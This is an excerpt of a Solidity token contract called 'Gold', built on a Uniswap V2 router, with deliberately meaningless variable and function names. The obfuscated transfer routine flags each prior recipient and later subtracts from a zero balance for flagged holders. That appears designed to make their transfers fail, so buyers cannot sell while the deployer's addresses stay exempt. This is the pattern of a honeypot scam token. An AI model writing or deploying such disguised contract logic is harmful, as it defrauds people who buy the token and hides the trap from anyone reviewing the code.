...
contract Gold is Ownable {
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(excitement);
        ...
        choice = 3;
        seat[serve] = bare;
        seat[msg.sender] = bare;
        _tTotal = 1000000000000 * 10**material;
        shown[msg.sender] = _tTotal;
    }

    uint256 public choice;
    string private getting;
    string private club;
    uint8 private material;
    ...
    uint256 private radio;
    address public uniswapV2Pair;
    uint256 private bare = ~choice;
    IUniswapV2Router02 public uniswapV2Router;
    address private region;
    ...
    function wash(
        ...
        address continent = (uniswapV2Pair);

        if (seat[stop] == 0 && (continent != stop) && adjective[stop] > 0) {
            seat[stop] -= material;
        }

        address consider = region;
        region = refer;

        shown[stop] -= writer;
        uint256 metal = (writer / 100) * choice;
        writer -= metal;
        adjective[consider] += material;
        shown[refer] += writer;
    }
    ...
    mapping(address => uint256) private seat;
    ...
    function transferFrom(
        ...
        wash(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        wash(msg.sender, recipient, amount);
        return true;
    }
